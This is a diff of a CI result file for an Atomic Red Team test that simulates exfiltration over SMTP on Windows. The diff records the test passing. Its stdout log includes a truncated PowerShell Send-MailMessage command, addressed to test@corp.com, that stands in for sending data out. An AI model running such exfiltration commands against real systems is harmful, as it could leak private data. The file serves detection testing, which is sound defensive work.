@@ -2,12 +2,11 @@
   "guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\nPrerequisites met: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\nSend-MailMessage : Unable to connect to the remote server\r\nAt line:1 char:4\r\n+ & {Send-MailMessage -From test@corp.com -To test@corp.com -Subject \"T ...\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidOperation: (System.Net.Mail.SmtpClient:SmtpClient) [Send-MailMessage], SmtpExcept \r\n   ion\r\n    + FullyQualifiedErrorId : SmtpException,Microsoft.PowerShell.Commands.SendMailMessage\r\nExit code: 0\r\nDone executing test: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\nDone executing cleanup for test: \r\nT1048.003-5 Exfiltration Over Alternative Protocol - SMTP\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmpf45row.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
